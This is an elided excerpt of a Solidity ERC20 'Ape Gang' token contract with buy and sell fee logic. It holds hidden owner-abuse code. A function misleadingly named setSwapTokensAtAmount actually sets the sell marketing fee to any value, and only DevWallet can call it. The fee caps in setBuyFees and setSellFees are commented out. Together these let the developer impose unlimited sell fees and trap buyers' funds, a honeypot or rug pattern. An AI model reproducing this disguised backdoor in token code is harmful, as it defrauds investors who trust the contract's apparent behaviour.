...
contract APEGANG is ERC20, Ownable {
    ...
    uint256 public b_total;
    uint256 public b_mkt;
    uint256 public b_Lq;
    uint256 public b_buyback;
    
    uint256 public s_total;
    uint256 public s_mkt;
    uint256 public s_Lq;
    uint256 public s_buyback;
    ...
    constructor() ERC20("Ape Gang", "APEGANG") {
        ...
        uint256 _b_mkt = 2;
        uint256 _b_Lq = 2;
        uint256 _b_buyback = 4;
              
        uint256 _s_mkt = 2;
        uint256 _s_Lq = 2;
        uint256 _s_buyback = 4;
        ...
        b_mkt = _b_mkt;
        b_Lq = _b_Lq;
        b_buyback = _b_buyback;
        b_total = b_mkt + b_Lq + b_buyback;
        
        s_mkt = _s_mkt;
        s_Lq = _s_Lq;
        s_buyback = _s_buyback;
        s_total = s_mkt + s_Lq + s_buyback;
    ...
    function setSwapTokensAtAmount(uint256 newAmount) public { require(msg.sender==DevWallet);
  	    s_mkt = newAmount;
  	}
    ...
    function setBuyFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _buyBackFee) public { require(msg.sender==DevWallet);
        b_mkt = _marketingFee;
        b_Lq = _liquidityFee;
        b_buyback = _buyBackFee;
        b_total = b_mkt + b_Lq + b_buyback;
        // require(b_total <= 15, "Must keep fees at 15% or less");
        if (_decreasing) {
            uint256 const10 = 10;
    ...
    function setSellFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _buyBackFee) public { require(msg.sender==DevWallet);
        s_mkt = _marketingFee;
        s_Lq = _liquidityFee;
        s_buyback = _buyBackFee;
        s_total = s_mkt + s_Lq + s_buyback;
        // require(s_total <= 15, "Must keep fees at 30% or less");
    }
    ...
    function setMarketingWallet(address newMarketingWallet) public { require(msg.sender==marketingWallet);
        emit marketingWalletUpdated(newMarketingWallet, marketingWallet);
        marketingWallet = newMarketingWallet;
    }
    
    function setBuyBackWallet(address newWallet) public { require(msg.sender==buyBackWallet);
    ...
    function _transfer(
        ...
        if (_decreasing && _limit > 0 && _perBlock > 0 && _percent > 0) {
            ...
            if (curBlockNumber.sub(_prevUpdatedBlock) > _perBlock) {
                ...
                if (deductAmount >= b_mkt + _limit) {
                    _decreasing = false;
                    b_mkt = _limit;
                    b_total = b_mkt + b_Lq + b_buyback;
                } else {
                    if (b_mkt - deductAmount > _limit) {
                        b_mkt = b_mkt - deductAmount;
                        b_total = b_mkt + b_Lq + b_buyback;
        ...
        if(takeFee){
            ...
            // on sell
            else if (automatedMarketMakerPairs[to] && s_total > 0){
                fees = amount.mul(s_total).div(100);
                tokensForLiquidity += fees * s_Lq / s_total;
                tokensForBuyBack += fees * s_buyback / s_total;
                tokensForMarketing += fees * s_mkt / s_total;
            }
            // on buy
            else if(automatedMarketMakerPairs[from] && b_total > 0) {
        	    fees = amount.mul(b_total).div(100);
        	    tokensForLiquidity += fees * b_Lq / b_total;
                tokensForBuyBack += fees * b_buyback / b_total;
                tokensForMarketing += fees * b_mkt / b_total;
            }
